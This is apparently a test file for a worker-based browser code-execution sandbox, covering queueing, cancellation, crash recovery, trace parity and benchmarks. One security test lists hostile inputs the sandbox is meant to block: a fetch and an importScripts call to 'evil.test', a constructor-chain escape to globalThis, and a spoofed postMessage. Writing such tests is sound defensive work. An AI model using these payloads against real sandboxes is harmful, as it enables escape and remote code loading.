/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 *
 * DRY RUN PHASE 2: BrowserExecutionManager, Worker Protocol, Cancellation,
 * Non-Blocking Main Thread, Security, Performance, and Golden Parity Tests
 */

import test from 'node:test';
import assert from 'node:assert/strict';

import {
  BrowserExecutionManager,
} from './browserExecutionManager';
import { createNodeWorkerThreadFactory } from './__tests__/nodeWorkerHarness';
import { createCancellationToken } from './contracts';
import {
  WorkerInboundMessage,
  WorkerOutboundMessage,
  WorkerTransport,
  WorkerTransportFactory,
} from './workerProtocol';
import { executeJavaScriptTrace } from '../languages/javascriptAdapter';
import { UniversalExecutionEngine } from '../languages/universalEngine';
import { JavaScriptLanguageAdapter } from '../languages/tracer';
import { GOLDEN_PROGRAMS } from '../golden/goldenPrograms';
import {
  compareTraces,
  validateTraceAgainstContract,
  formatTraceComparisonReport,
} from '../golden/traceComparator';

function createControlledMockFactory(
  handlers: {
    onCreate?: (slotIndex: number, transport: MockWorkerControl) => void;
    onMessage?: (
      msg: WorkerInboundMessage,
      transport: MockWorkerControl,
      slotIndex: number
    ) => void;
    onTerminate?: (slotIndex: number) => void;
  }
): WorkerTransportFactory {
  let count = 0;
  return () => {
    const idx = count++;
    const control: MockWorkerControl = {
      terminated: false,
      inboundMessages: [],
      onmessage: null,
      onerror: null,
      onmessageerror: null,
      emitMessage(data: WorkerOutboundMessage) {
        if (!control.terminated) {
          control.onmessage?.({ data });
        }
      },
      emitError(message: string) {
        if (!control.terminated) {
          control.onerror?.({ message });
        }
      },
      emitMessageError(err: unknown) {
        if (!control.terminated) {
          control.onmessageerror?.(err);
        }
      },
      postMessage(msg: WorkerInboundMessage) {
        if (control.terminated) return;
        control.inboundMessages.push(msg);
        handlers.onMessage?.(msg, control, idx);
      },
      terminate() {
        control.terminated = true;
        handlers.onTerminate?.(idx);
      },
    };
    handlers.onCreate?.(idx, control);
    return control;
  };
}

interface MockWorkerControl extends WorkerTransport {
  terminated: boolean;
  inboundMessages: WorkerInboundMessage[];
  emitMessage(data: WorkerOutboundMessage): void;
  emitError(message: string): void;
  emitMessageError(err: unknown): void;
}

test('1. Worker creation, initialization warmup telemetry, and JS/TS worker execution', async () => {
  const manager = new BrowserExecutionManager({
    workerFactory: createNodeWorkerThreadFactory(),
    maxConcurrentWorkers: 2,
  });

  try {
    const jsCap = await manager.getCapabilities('javascript');
    const tsCap = await manager.getCapabilities('typescript');
    assert.equal(jsCap.available, true);
    assert.equal(jsCap.supportsCancellation, true);
    assert.equal(jsCap.addressModel, 'symbolic_identity');
    assert.equal(tsCap.available, true);

    const jsTrace = await manager.execute({
      language: 'javascript',
      code: `const nums = [10, 20, 30];\nlet sum = 0;\nfor (let i = 0; i < nums.length; i++) {\n  sum += nums[i];\n}\nconsole.log(sum);`,
    });

    assert.equal(jsTrace.status, 'completed');
    const lastJs = jsTrace.events[jsTrace.events.length - 1];
    assert.deepEqual(lastJs.stdout, ['60']);

    const afterFirstMetrics = manager.getMetrics();
    assert.equal(afterFirstMetrics.initCount, 1);
    assert.ok(afterFirstMetrics.lastInitTimeMs >= 1);
    assert.equal(afterFirstMetrics.completedExecutions, 1);
    assert.equal(afterFirstMetrics.idleWorkers, 1);

    // Warm TypeScript run reuses initialized worker slot
    const tsTrace = await manager.execute({
      language: 'typescript',
      code: `interface Pair { a: number; b: number }\nconst p: Pair = { a: 7, b: 8 };\nconsole.log(p.a + p.b);`,
    });

    assert.equal(tsTrace.status, 'completed');
    assert.deepEqual(tsTrace.events[tsTrace.events.length - 1].stdout, ['15']);

    const afterSecondMetrics = manager.getMetrics();
    assert.equal(afterSecondMetrics.initCount, 1, 'Warm worker must be reused');
    assert.equal(afterSecondMetrics.completedExecutions, 2);
  } finally {
    await manager.dispose();
  }
});

test('2. Message correlation ignores late/stale messages and out-of-order executionIds', async () => {
  const controls: MockWorkerControl[] = [];
  const manager = new BrowserExecutionManager({
    workerFactory: createControlledMockFactory({
      onCreate: (_idx, ctrl) => controls.push(ctrl),
      onMessage: (msg, ctrl) => {
        if (msg.type === 'initialize') {
          ctrl.emitMessage({
            type: 'initialized',
            requestId: msg.requestId,
            language: msg.language,
            initDurationMs: 2,
          });
          return;
        }
        if (msg.type === 'execute') {
          // Inject bogus stale completion from unknown/previous executionId first!
          ctrl.emitMessage({
            type: 'completed',
            executionId: 'stale_execution_999',
            trace: {
              language: msg.language,
              sourceCode: 'stale',
              events: [],
              totalSteps: 0,
              status: 'completed',
              metrics: {
                executionTimeMs: 1,
                stepCount: 0,
                peakMemoryBytes: 0,
                heapAllocations: 0,
              },
            },
          });

          // Emit real completion for active executionId
          ctrl.emitMessage({
            type: 'completed',
            executionId: msg.executionId,
            trace: {
              language: msg.language,
              sourceCode: msg.code,
              events: [],
              totalSteps: 0,
              status: 'completed',
              metrics: {
                executionTimeMs: 3,
                stepCount: 0,
                peakMemoryBytes: 0,
                heapAllocations: 0,
              },
            },
          });
        }
      },
    }),
  });

  try {
    const trace = await manager.execute({
      executionId: 'exec_real_1',
      language: 'javascript',
      code: 'const x = 42;',
    });

    assert.equal(trace.sourceCode, 'const x = 42;');
    assert.equal(trace.status, 'completed');
    assert.equal(manager.getMetrics().ignoredLateMessages, 1);
  } finally {
    await manager.dispose();
  }
});

test('3. Concurrent worker pool enforces maxConcurrentWorkers & FIFO queueing', async () => {
  let maxSimultaneous = 0;
  let currentActive = 0;
  const order: string[] = [];

  const manager = new BrowserExecutionManager({
    maxConcurrentWorkers: 2,
    maxQueueSize: 4,
    workerFactory: createControlledMockFactory({
      onMessage: (msg, ctrl) => {
        if (msg.type === 'initialize') {
          setTimeout(() => {
            ctrl.emitMessage({
              type: 'initialized',
              requestId: msg.requestId,
              language: msg.language,
              initDurationMs: 1,
            });
          }, 5);
          return;
        }
        if (msg.type === 'execute') {
          currentActive += 1;
          maxSimultaneous = Math.max(maxSimultaneous, currentActive);
          order.push(msg.executionId);
          setTimeout(() => {
            currentActive -= 1;
            ctrl.emitMessage({
              type: 'completed',
              executionId: msg.executionId,
              trace: {
                language: msg.language,
                sourceCode: msg.code,
                events: [],
                totalSteps: 0,
                status: 'completed',
                metrics: {
                  executionTimeMs: 10,
                  stepCount: 0,
                  peakMemoryBytes: 0,
                  heapAllocations: 0,
                },
              },
            });
          }, 30);
        }
      },
    }),
  });

  try {
    const stagesForThird: string[] = [];
    const results = await Promise.all([
      manager.execute({ executionId: 'run_1', language: 'javascript', code: 'let a = 1;' }),
      manager.execute({ executionId: 'run_2', language: 'typescript', code: 'let b: number = 2;' }),
      manager.execute({
        executionId: 'run_3',
        language: 'javascript',
        code: 'let c = 3;',
        onProgress: (p) => stagesForThird.push(p.stage),
      }),
      manager.execute({ executionId: 'run_4', language: 'javascript', code: 'let d = 4;' }),
    ]);

    assert.equal(results.length, 4);
    assert.ok(results.every((r) => r.status === 'completed'));
    assert.equal(maxSimultaneous, 2, 'Active workers must never exceed maxConcurrentWorkers=2');
    assert.deepEqual(order, ['run_1', 'run_2', 'run_3', 'run_4']);
    assert.ok(stagesForThird.includes('queued'), '3rd request must report queued stage');
  } finally {
    await manager.dispose();
  }
});

test('4. Hard termination, non-blocking event loop, and partial trace preservation under infinite loop', async () => {
  const manager = new BrowserExecutionManager({
    workerFactory: createNodeWorkerThreadFactory(),
    maxConcurrentWorkers: 1,
    watchdogBufferMs: 40,
  });

  try {
    // Prove main thread event loop ticks continuously while Worker executes infinite loop!
    let mainLoopTicks = 0;
    const ticker = setInterval(() => {
      mainLoopTicks += 1;
    }, 15);

    const infiniteLoopCode = `
let i = 0;
while (true) {
  i++;
}
`;
    const start = Date.now();
    const trace = await manager.execute({
      language: 'javascript',
      code: infiniteLoopCode,
      options: {
        maxSteps: 1000000, // High step cap so wall-clock timeout / worker.terminate triggers
        timeoutMs: 180,
      },
    });
    clearInterval(ticker);
    const elapsed = Date.now() - start;

    assert.equal(trace.status, 'timeout', `Expected timeout status, got ${trace.status}`);
    assert.ok(
      mainLoopTicks >= 3,
      `Main event loop must remain unblocked during worker loop (ticks=${mainLoopTicks})`
    );
    assert.ok(
      elapsed < 2500,
      `Timeout watchdog must halt infinite loop promptly (elapsed=${elapsed}ms)`
    );
    assert.ok(
      trace.events.length >= 1,
      'Must return trace events / error event on timeout termination'
    );

    // Worker pool must immediately recover and execute valid code after termination!
    const recoveryTrace = await manager.execute({
      language: 'javascript',
      code: 'const ok = 123;\nconsole.log(ok);',
    });
    assert.equal(recoveryTrace.status, 'completed');
    assert.deepEqual(
      recoveryTrace.events[recoveryTrace.events.length - 1].stdout,
      ['123']
    );
  } finally {
    await manager.dispose();
  }
});

test('5. Cancellation (queued, active hard termination, and rapid superseding / unmount)', async () => {
  let terminateCount = 0;
  const manager = new BrowserExecutionManager({
    maxConcurrentWorkers: 1,
    hardCancelGraceMs: 25,
    workerFactory: createControlledMockFactory({
      onMessage: (msg, ctrl) => {
        if (msg.type === 'initialize') {
          ctrl.emitMessage({
            type: 'initialized',
            requestId: msg.requestId,
            language: msg.language,
            initDurationMs: 1,
          });
          return;
        }
        if (msg.type === 'execute') {
          // Simulate partial streamed steps from worker before hang
          ctrl.emitMessage({
            type: 'trace_event',
            executionId: msg.executionId,
            events: [
              {
                stepIndex: 0,
                type: 'declare',
                line: 1,
                col: 1,
                codeLine: 'let x = 1;',
                description: 'Declared x = 1',
                stackFrames: [],
                heap: {},
                stdout: [],
                stderr: [],
                diffs: [],
                timestamp: Date.now(),
              },
            ],
          });
        }
      },
      onTerminate: () => {
        terminateCount += 1;
      },
    }),
  });

  try {
    const token1 = createCancellationToken();
    const token2 = createCancellationToken();

    const p1 = manager.execute({
      executionId: 'active_hang',
      language: 'javascript',
      code: 'let x = 1;\nwhile(true){}',
      cancellationToken: token1,
    });
    const p2 = manager.execute({
      executionId: 'queued_job',
      language: 'typescript',
      code: 'const y: number = 2;',
      cancellationToken: token2,
    });

    // Give p1 a moment to begin executing and post partial trace_event
    await new Promise((r) => setTimeout(r, 15));

    // Cancel queued job first -> resolves immediately without spawning worker
    token2.cancel('Superseded while queued');
    const r2 = await p2;
    assert.equal(r2.status, 'error');
    assert.match(r2.errorMessage || '', /queued/i);

    // Cancel active hung job -> falls back to worker.terminate() and preserves partial events
    token1.cancel('User switched language');
    const r1 = await p1;
    assert.equal(r1.status, 'error');
    assert.match(r1.errorMessage || '', /switched language/i);
    assert.ok(r1.events.length >= 2, 'Partial event + error event preserved on cancel');
    assert.equal(r1.events[0].type, 'declare');
    assert.equal(terminateCount, 1);
    assert.equal(manager.getMetrics().hardTerminatedWorkers, 1);
  } finally {
    await manager.dispose();
  }
});

test('6. Worker error / crash recovery & cleanup after dispose', async () => {
  const manager = new BrowserExecutionManager({
    maxConcurrentWorkers: 1,
    workerFactory: createControlledMockFactory({
      onMessage: (msg, ctrl, idx) => {
        if (msg.type === 'initialize') {
          ctrl.emitMessage({
            type: 'initialized',
            requestId: msg.requestId,
            language: msg.language,
            initDurationMs: 1,
          });
          return;
        }
        if (msg.type === 'execute') {
          if (idx === 0) {
            ctrl.emitError('OutOfMemory crash inside worker');
          } else {
            ctrl.emitMessage({
              type: 'completed',
              executionId: msg.executionId,
              trace: {
                language: msg.language,
                sourceCode: msg.code,
                events: [],
                totalSteps: 0,
                status: 'completed',
                metrics: {
                  executionTimeMs: 2,
                  stepCount: 0,
                  peakMemoryBytes: 0,
                  heapAllocations: 0,
                },
              },
            });
          }
        }
      },
    }),
  });

  const crashed = await manager.execute({
    language: 'javascript',
    code: 'const a = 1;',
  });
  assert.equal(crashed.status, 'error');
  assert.match(crashed.errorMessage || '', /OutOfMemory crash/);
  assert.equal(manager.getMetrics().workerCrashes, 1);

  // Subsequent run spawns fresh replacement worker slot #1 cleanly
  const recovered = await manager.execute({
    language: 'javascript',
    code: 'const b = 2;',
  });
  assert.equal(recovered.status, 'completed');

  await manager.dispose();
  const disposedMetrics = manager.getMetrics();
  assert.equal(disposedMetrics.activeWorkers, 0);
  assert.equal(disposedMetrics.idleWorkers, 0);
  assert.equal(disposedMetrics.queuedExecutions, 0);

  const afterDispose = await manager.execute({
    language: 'javascript',
    code: 'const c = 3;',
  });
  assert.equal(afterDispose.status, 'error');
  assert.match(afterDispose.errorMessage || '', /disposed/i);
});

test('7. Source mapping, security restrictions, and Worker global shadowing', async () => {
  const manager = new BrowserExecutionManager({
    workerFactory: createNodeWorkerThreadFactory(),
  });

  try {
    // 1. Source line mapping on runtime error (top-level & inside call)
    const runtimeErrTrace = await manager.execute({
      language: 'typescript',
      code: `const x: number = 10;\nconst y: any = null;\nconst z = y.prop;\n`,
    });
    assert.equal(runtimeErrTrace.status, 'error');
    const errEv = runtimeErrTrace.events.find((e) => e.type === 'error');
    assert.ok(errEv);
    assert.equal(errEv!.line, 3, 'Runtime error must map cleanly back to line 3');

    // 2. Worker global shadowing blocks postMessage / importScripts / caches / fetch / constructor escapes
    const securityChecks = [
      `fetch("https://evil.test");`,
      `const x = []["constructor"]["constructor"]("return globalThis")();`,
      `postMessage({ type: "completed", executionId: "spoof" });`,
      `importScripts("https://evil.test/x.js");`,
      `const c = caches; console.log(typeof c);`,
    ];

    for (const badCode of securityChecks.slice(0, 2)) {
      const t = await manager.execute({ language: 'javascript', code: badCode });
      assert.equal(t.status, 'error');
      assert.match(t.errorMessage || '', /Security sandbox check failed/);
    }

    // Worker globals like postMessage / importScripts / caches are shadowed to undefined even if passed static filter!
    const shadowedTest = await manager.execute({
      language: 'javascript',
      code: `console.log(typeof postMessage, typeof importScripts, typeof caches, typeof navigator, typeof BroadcastChannel);`,
    });
    assert.equal(shadowedTest.status, 'completed');
    assert.deepEqual(
      shadowedTest.events[shadowedTest.events.length - 1].stdout,
      ['undefined undefined undefined undefined undefined']
    );
  } finally {
    await manager.dispose();
  }
});

test('8. Mode selection policy: explicit browser mode never silently falls back to Node main thread', async () => {
  const unavailableManager = new BrowserExecutionManager({
    workerFactory: null,
  });

  const trace = await executeJavaScriptTrace('const x = 1;', {
    language: 'javascript',
    modePreference: 'browser',
    browserManager: unavailableManager,
  });

  assert.equal(trace.status, 'error');
  assert.match(trace.errorMessage || '', /Browser Mode runtime is not available|unavailable/i);

  const adapter = new JavaScriptLanguageAdapter('typescript');
  const unified = adapter.toUnifiedAdapter();
  assert.equal(unified.mode, 'browser');
  assert.equal(unified.language, 'typescript');
  const cap = await unified.getCapabilities();
  assert.equal(cap.mode, 'browser');
});

test('9. Phase 1 Golden Suite parity: JS & TS traces via real Worker harness match Node baseline identically', async () => {
  const manager = new BrowserExecutionManager({
    workerFactory: createNodeWorkerThreadFactory(),
    maxConcurrentWorkers: 2,
  });

  try {
    const jsTsPrograms = GOLDEN_PROGRAMS.filter(
      (p) => p.language === 'javascript' || p.language === 'typescript'
    );
    assert.ok(jsTsPrograms.length >= 20, 'Should test all JS & TS golden programs');

    for (const program of jsTsPrograms) {
      const [directTrace, workerTrace] = await Promise.all([
        UniversalExecutionEngine.execute(program.language, program.sourceCode),
        manager.execute({
          language: program.language,
          code: program.sourceCode,
        }),
      ]);

      const diff = compareTraces(workerTrace, directTrace);

      assert.equal(
        diff.equal,
        true,
        `Worker parity mismatch for golden program '${program.id}': ${formatTraceComparisonReport(program.id, diff)}`
      );

      const contractResult = validateTraceAgainstContract(workerTrace, program);
      assert.equal(
        contractResult.equal,
        true,
        `Golden contract failure for '${program.id}' in Worker: ${formatTraceComparisonReport(program.id, contractResult)}`
      );
    }
  } finally {
    await manager.dispose();
  }
});

test('10. Performance benchmark: worker init latency, cold vs warm run, and payload size', async () => {
  const manager = new BrowserExecutionManager({
    workerFactory: createNodeWorkerThreadFactory(),
    maxConcurrentWorkers: 1,
  });

  try {
    const sampleCode = `const nums = [5, 2, 8, 1, 9, 3];
for (let i = 0; i < nums.length; i++) {
  for (let j = i + 1; j < nums.length; j++) {
    if (nums[i] > nums[j]) {
      const t = nums[i];
      nums[i] = nums[j];
      nums[j] = t;
    }
  }
}
console.log(nums);`;

    const coldStart = performance.now();
    const coldTrace = await manager.execute({
      language: 'javascript',
      code: sampleCode,
    });
    const coldWallMs = Math.round(performance.now() - coldStart);
    const coldMetrics = manager.getMetrics();

    const warmStart = performance.now();
    const warmTrace = await manager.execute({
      language: 'javascript',
      code: sampleCode,
    });
    const warmWallMs = Math.round(performance.now() - warmStart);
    const warmMetrics = manager.getMetrics();

    assert.equal(coldTrace.status, 'completed');
    assert.equal(warmTrace.status, 'completed');
    assert.ok(coldMetrics.lastInitTimeMs >= 1);
    assert.ok((warmMetrics.lastExecutionMetrics?.serializedPayloadBytes ?? 0) > 100);

    console.log(
      `[Phase 2 Benchmark] Worker init=${coldMetrics.lastInitTimeMs}ms | Cold total=${coldWallMs}ms | Warm total=${warmWallMs}ms | Events=${warmTrace.events.length} | Payload=${warmMetrics.lastExecutionMetrics?.serializedPayloadBytes} bytes`
    );
  } finally {
    await manager.dispose();
  }
});
